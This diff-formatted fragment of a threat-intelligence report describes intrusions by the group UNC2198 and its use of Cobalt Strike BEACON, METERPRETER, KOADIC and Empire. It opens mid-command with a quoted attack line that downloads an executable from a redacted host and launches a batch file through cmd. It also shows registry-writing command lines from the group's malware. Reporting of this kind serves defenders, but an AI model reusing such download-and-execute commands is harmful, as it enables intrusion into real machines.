@@ -1,0 +1,13 @@
+
+Net.
+WebClient).Downloadfile(http://<REDACTED>/<REDACTED>.exe, <REDACTED>.exe) ^
+> %SYSTEMDRIVE%\\WINDOWS\\Temp\\AVaNbBXzKyxktAZI.txt > \\WINDOWS\\Temp\\yoKjaqTIzJhdDLjD.bat & %COMSPEC% /C
+start %COMSPEC% /C
+\\WINDOWS\\Temp\\yoKjaqTIzJhdDLjD.bat UNC2198 has used Cobalt Strike BEACON, Metasploit METERPRETER, KOADIC, and PowerShell EMPIRE offensive security tools during this phase as well.
+Offensive Security Tooling UNC2198 has used offensive security tools similarly seen across many threat actors.
+UNC2198 has used BEACON in roughly 90% of their intrusions.
+UNC2198 installs and executes Cobalt Strike BEACON in a variety of ways, including shellcode loaders using PowerShell scripts, service executables, and DLLs.
+While the ways and means of using BEACON are not inherently unique, there are still aspects to extrapolate that shed light on UNC2198 TTPs.
+Focusing in on specific BEACON executables tells a different story beyond the use of the tool itself.
+Aside from junk code and API calls, UNC2198 BEACON and METERPRETER executables often exhibit unique characteristics of malware packaging, including odd command-line arguments visible within strings and upon execution via child processes: cmd.exe /c echo TjsfoRdwOe=9931 & reg add HKCU\\SOFTWARE\\WIlumYjNSyHob /v xFCbJrNfgBNqRy /t
+REG_DWORD /d 3045 & exit cmd.exe /c echo ucQhymDRSRvq=1236 & reg add HKCU\\\\SOFTWARE\\\\YkUJvbgwtylk /v KYIaIoYxqwO /t
